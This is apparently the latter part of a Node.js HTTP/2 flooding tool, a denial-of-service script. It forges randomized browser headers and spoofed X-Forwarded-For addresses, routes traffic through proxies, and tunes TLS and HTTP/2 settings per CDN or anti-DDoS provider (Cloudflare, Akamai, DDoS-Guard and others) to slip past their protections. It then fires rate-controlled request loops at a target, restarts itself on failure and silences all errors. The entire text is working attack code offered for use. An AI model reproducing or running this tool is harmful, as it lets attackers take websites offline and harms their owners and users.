    "accept-language": ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.7"][Math.floor(Math.random() * 4)],
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",

    "referer": [
        "https://www.google.com/", "https://m.youtube.com/", "https://www.tiktok.com/",
        "https://m.facebook.com/", "https://mobile.twitter.com/", "https://m.instagram.com/",
        "https://m.wikipedia.org/", "https://www.reddit.com/r/all/", "https://www.quora.com/"
    ][Math.floor(Math.random() * 9)],

    "origin": ["https://m.youtube.com", "https://www.tiktok.com", "https://m.facebook.com"][Math.floor(Math.random() * 3)],

    "x-forwarded-for": Math.random() < 0.5 
        ? `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}` 
        : `2001:db8:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": ["same-origin", "same-site", "cross-site"][Math.floor(Math.random() * 3)],

    "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
},
    firefox: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 
        ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
        : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),

    "sec-ch-ua": `"Mozilla Firefox";v="${Math.floor(115 + Math.random() * 10)}"`,
    "sec-ch-ua-mobile": Math.random() < 0.3 ? "?1" : "?0",
    "sec-ch-ua-platform": ["Windows", "Linux", "Android", "Macintosh"][Math.floor(Math.random() * 4)],
    "sec-ch-ua-platform-version": (() => {
        let platform = ["Windows", "Linux", "Android", "Macintosh"][Math.floor(Math.random() * 4)];
        if (platform === "Windows") return `"${Math.random() < 0.5 ? '10.0' : '11.0'}"`;
        if (platform === "Macintosh") return `"${Math.random() < 0.5 ? '10.15.7' : '11.6'}"`;
        if (platform === "Android") return `"${Math.random() < 0.5 ? '12.0' : '13.0'}"`;
        return undefined; // Linux tidak memiliki sec-ch-ua-platform-version
    })(),

    "user-agent": Math.random() < 0.5 
        ? `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64; rv:${Math.floor(115 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(115 + Math.random() * 10)}.0`
        : `Mozilla/5.0 (X11; Linux x86_64; rv:${Math.floor(115 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(115 + Math.random() * 10)}.0`,

    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
    "accept-language": ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.7", "de-DE,de;q=0.8"][Math.floor(Math.random() * 5)],
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",

    "referer": [
        "https://www.google.com/", "https://m.youtube.com/", "https://www.reddit.com/", 
        "https://github.com/", "https://stackoverflow.com/", "https://www.wikipedia.org/",
        "https://news.ycombinator.com/", "https://www.instagram.com/", "https://www.tiktok.com/"
    ][Math.floor(Math.random() * 9)],

    "origin": ["https://developer.mozilla.org", "https://github.com", "https://www.reddit.com", "https://www.twitter.com"][Math.floor(Math.random() * 4)],

    "x-forwarded-for": Math.random() < 0.4 
        ? `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}` 
        : `2001:db8:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": ["same-origin", "same-site", "cross-site"][Math.floor(Math.random() * 3)],

    "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
},
    opera: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 
        ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
        : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),

    "sec-ch-ua": `"Opera";v="${Math.floor(95 + Math.random() * 10)}", "Chromium";v="${Math.floor(119 + Math.random() * 6)}"`,
    "sec-ch-ua-mobile": Math.random() < 0.3 ? "?1" : "?0",
    "sec-ch-ua-platform": ["Windows", "Linux", "Android", "Macintosh"][Math.floor(Math.random() * 4)],
    "sec-ch-ua-platform-version": (() => {
        let platform = ["Windows", "Linux", "Android", "Macintosh"][Math.floor(Math.random() * 4)];
        if (platform === "Windows") return `"${Math.random() < 0.5 ? '10.0' : '11.0'}"`;
        if (platform === "Macintosh") return `"${Math.random() < 0.5 ? '10.15.7' : '11.6'}"`;
        if (platform === "Android") return `"${Math.random() < 0.5 ? '12.0' : '13.0'}"`;
        return undefined; // Linux tidak memiliki sec-ch-ua-platform-version
    })(),

    "user-agent": Math.random() < 0.5 
        ? `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(119 + Math.random() * 6)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(95 + Math.random() * 10)}.0.0.0`
        : `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(119 + Math.random() * 6)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(95 + Math.random() * 10)}.0.0.0`,

    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
    "accept-language": ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.7", "de-DE,de;q=0.8"][Math.floor(Math.random() * 5)],
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",

    "referer": [
        "https://www.google.com/", "https://m.youtube.com/", "https://www.reddit.com/", 
        "https://github.com/", "https://stackoverflow.com/", "https://www.wikipedia.org/",
        "https://news.ycombinator.com/", "https://www.instagram.com/", "https://www.tiktok.com/"
    ][Math.floor(Math.random() * 9)],

    "origin": ["https://www.opera.com", "https://github.com", "https://www.reddit.com", "https://www.bbc.com"][Math.floor(Math.random() * 4)],

    "x-forwarded-for": Math.random() < 0.4 
        ? `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}` 
        : `2001:db8:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": ["same-origin", "same-site", "cross-site"][Math.floor(Math.random() * 3)],

    "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
},
    operagx: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 
        ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
        : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),

    "sec-ch-ua": `"Opera GX";v="${Math.floor(99 + Math.random() * 6)}", "Chromium";v="${Math.floor(119 + Math.random() * 6)}"`,
    "sec-ch-ua-mobile": "?0", // Opera GX hanya tersedia untuk desktop
    "sec-ch-ua-platform": "Windows",
    "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0"` : `"11.0"`,

    "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(119 + Math.random() * 6)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(99 + Math.random() * 6)}.0.0.0 GX`,

    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
    "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",

    "referer": [
        "https://www.google.com/", "https://store.steampowered.com/", "https://www.epicgames.com/", 
        "https://www.twitch.tv/", "https://discord.com/", "https://www.opera.com/gx",
        "https://www.youtube.com/", "https://twitter.com/", "https://www.instagram.com/"
    ][Math.floor(Math.random() * 9)],

    "origin": ["https://www.opera.com/gx", "https://discord.com", "https://store.steampowered.com", "https://www.twitch.tv"][Math.floor(Math.random() * 4)],

    "x-forwarded-for": Math.random() < 0.4 
        ? `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}` 
        : `2001:db8:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",

    "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
},
    duckduckgo: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 
        ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
        : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),

    "sec-ch-ua": `"DuckDuckGo";v="${Math.floor(10 + Math.random() * 5)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}"`,
    "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
    "sec-ch-ua-platform": "Windows",
    "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0"` : `"11.0"`,

    "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 DuckDuckGo/${Math.floor(10 + Math.random() * 5)}.0`,

    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
    "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",

    "referer": [
        "https://www.google.com/", "https://store.steampowered.com/", "https://www.epicgames.com/", 
        "https://www.twitch.tv/", "https://discord.com/", "https://www.opera.com/gx",
        "https://www.youtube.com/", "https://twitter.com/", "https://www.instagram.com/"
    ][Math.floor(Math.random() * 9)],

    "origin": ["https://www.opera.com/gx", "https://discord.com", "https://store.steampowered.com", "https://www.twitch.tv"][Math.floor(Math.random() * 4)],

    "x-forwarded-for": Math.random() < 0.4 
        ? `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}` 
        : `2001:db8:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",

    "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
}
};

    return headersMap[browser];
};
const browser = getRandomBrowser();
const headers = generateHeaders(browser);
function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
const randomString = randstr(10);

                        const headers4 = {
                            ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
                            ...(Math.random() < 0.75 ?{"referer": "https:/" +clength} :{}),
                            ...(Math.random() < 0.75 ?{"origin": Math.random() < 0.5 ? "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4) + '/' : '@root/'): "https://"+ (Math.random() < 0.5 ?'root-admin.': 'root-root.') +clength}:{}),
                        }

                        let allHeaders = Object.assign({}, headers, headers4);
                        dyn = {
	...(Math.random() < 0.5 ?{['cf-sec-with-from-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
 ...(Math.random() < 0.5 ?{['user-x-with-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),			  
},
                      dyn2 = {
                        ...(Math.random() < 0.5 ?{"upgrade-insecure-requests": "1"} : {}),
                        ...(Math.random() < 0.5 ? { "purpose": "prefetch"} : {} ),
                        "RTT" : "1"

                      }  

const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 10
};

Socker.HTTP(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const settings = {
        initialWindowSize: 15663105,
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: cipper,
        requestCert: true,
        sigalgs: sigalgs,
        socket: connection,
        ecdhCurve: ecdhCurve,
        secureContext: secureContext,
        honorCipherOrder: false,
        rejectUnauthorized: false,
       secureProtocol: Math.random() < 0.5 ? ['TLSv1.3_method', 'TLSv1.2_method'] : ['TLSv1.3_method'],
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
    };
    
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
    
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);
    
    function generateJA3Fingerprint(socket) {
        const cipherInfo = socket.getCipher();
        const supportedVersions = socket.getProtocol();
    
        if (!cipherInfo) {
            console.error('Cipher info is not available. TLS handshake may not have completed.');
            return null;
        }
    
        const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
    
        const md5Hash = crypto.createHash('md5');
        md5Hash.update(ja3String);
    
        return md5Hash.digest('hex');
    }
    
    tlsSocket.on('connect', () => {
        const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
    });
    function getSettingsBasedOnISP(isp) {
        const defaultSettings = {
            headerTableSize: 65536,
            initialWindowSize: Math.random() < 0.5 ? 6291456: 33554432,
            maxHeaderListSize: 262144,
            enablePush: false,
            maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
            maxFrameSize: 16384,
            enableConnectProtocol: false,
        };
    
        const settings = { ...defaultSettings };
    
        if (isp === 'Cloudflare, Inc.') {
            settings.maxConcurrentStreams = Math.random() < 0.5 ? 100 : 1000;
            settings.initialWindowSize = 65536;
            settings.maxFrameSize = 16384;
            settings.enableConnectProtocol = false;
        } else if (['FDCservers.net', 'OVH SAS', 'VNXCLOUD'].includes(isp)) {
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65536;
            settings.maxFrameSize = 16777215;
            settings.maxConcurrentStreams = 128;
            settings.maxHeaderListSize = 4294967295;
        } else if (['Akamai Technologies, Inc.', 'Akamai International B.V.'].includes(isp)) {
            settings.headerTableSize = 4096;
            settings.maxConcurrentStreams = 100;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = 16384;
            settings.maxHeaderListSize = 32768;
        } else if (['Fastly, Inc.', 'Optitrust GmbH'].includes(isp)) {
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
        } else if (isp === 'Ddos-guard LTD') {
            settings.maxConcurrentStreams = 8;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16777215;
            settings.maxHeaderListSize = 262144;
        } else if (['Amazon.com, Inc.', 'Amazon Technologies Inc.'].includes(isp)) {
            settings.maxConcurrentStreams = 100;
            settings.initialWindowSize = 65535;
            settings.maxHeaderListSize = 262144;
        } else if (['Microsoft Corporation', 'Vietnam Posts and Telecommunications Group', 'VIETNIX'].includes(isp)) {
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 8388608;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
        } else if (isp === 'Google LLC') {
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 1048576;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 137216;
        } else {
            settings.headerTableSize = 65535;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxHeaderListSize = 261144;
            settings.maxFrameSize = 16384;
        }
    
        return settings;
    }
    
    let hpack = new HPACK();
    let client;
    const clients = [];
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsSocket,
        settings : getSettingsBasedOnISP(isp),
        socket: tlsSocket,
    });
    clients.push(client);
    client.setMaxListeners(0);
    
    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    
    client.on('connect', () => {
    client.ping((err, duration, payload) => {
    });

    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
});

    clients.forEach(client => {
    const intervalId = setInterval(() => {
        async function sendRequests() {
            const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };

            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];

            const dynHeaders = shuffleObject({
                ...dyn,
                ...allHeaders,
                ...dyn2,
                ...(Math.random() < 0.5 ? taoDoiTuongNgauNhien() : {}),
            });

            const packed = Buffer.concat([
                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                hpack.encode(dynHeaders)
            ]);

            const streamId = 1;
            const requests = [];
            let count = 0;

            const increaseRequestRate = async (client, dynHeaders, args) => {
                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                    for (let i = 0; i < args.Rate; i++) {
                        const requestPromise = new Promise((resolve, reject) => {
                            const req = client.request(dynHeaders, {
                                weight: Math.random() < 0.5 ? 251 : 231,
                                depends_on: 0,
                                exclusive: Math.random() < 0.5 ? true : false,
                            })
                            .on('response', response => {
                                req.close(http2.constants.NO_ERROR);
                                req.destroy();
                                resolve();
                            });
                            req.on('end', () => {
                                count++;
                                if (count === args.time * args.Rate) {
                                    clearInterval(intervalId);
                                    client.close(http2.constants.NGHTTP2_CANCEL);
                                }
                                reject(new Error('Request timed out'));
                            });

                            req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                        });

                        const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
                        requests.push({ requestPromise, frame });
                    }

                    await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                }
            }

            await increaseRequestRate(client, dynHeaders, args);
        }

        sendRequests();
    }, 500);
});

    
        client.on("close", () => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
            return runFlooder();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return runFlooder();
        });
        });
    }
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});


